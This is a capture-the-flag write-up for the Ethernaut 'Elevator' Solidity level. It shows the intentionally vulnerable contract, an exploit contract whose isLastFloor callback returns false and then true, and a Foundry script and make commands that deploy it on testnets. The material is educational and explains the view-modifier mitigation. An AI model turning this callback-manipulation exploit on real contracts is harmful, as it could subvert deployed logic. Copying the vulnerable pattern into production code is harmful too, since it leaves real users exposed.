# Level 11 - Elevator ⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/11" %}

### Level Setup

{% hint style="info" %}
This elevator won't let you reach the top of your building. Right?

**Things that might help:**

* Sometimes solidity is not good at keeping promises.
* This `Elevator` expects to be used from a `Building`.
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/Elevator.sol" %}

{% code lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
{% endcode %}

### Exploit

`top` must first return `false` when called, then `true` the next time. The interface for `Building` is set to `msg.sender`.&#x20;

1. Create a contract that exploits this by implementing a function `isLastFloor` that sets `top` to `true`.

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-11

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-11

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/src/Level11.sol" %}

{% code title="src/Level1.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

// ================================================================
// │                        LEVEL 11 - ELEVATOR                   │
// ================================================================
interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    IElevator targetContract;
    bool public last = true;

    constructor(address _targetContractAddress) payable {
        targetContract = IElevator(_targetContractAddress);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (_floor > 0) {
            last = !last;
            return last;
        } else {
            revert("Invalid floor");
        }
    }

    function attack() public {
        targetContract.goTo(1);
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/script/Level11.s.sol" %}

{% code title="script/Level11.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";
import {Building} from "../src/Level11.sol";

// ================================================================
// │                        LEVEL 11 - ELEVATOR                   │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        Building building = new Building(targetContractAddress);
        building.attack();
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

2. Submit instance... 🥳

### Completion Message

{% hint style="info" %}
You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. `gasleft()`.
{% endhint %}

### Notes

* The function `isLastFloor` is called twice, with the returned value changing for the same input as the state is changed.
* If the `isLastFloor` had been restricted to view, then this attack wouldn't be possible (unless it was calling a library, which [doesn't have runtime checks](https://docs.soliditylang.org/en/develop/contracts.html#view-functions) to make sure it doesn't modify the state when it says it's view)
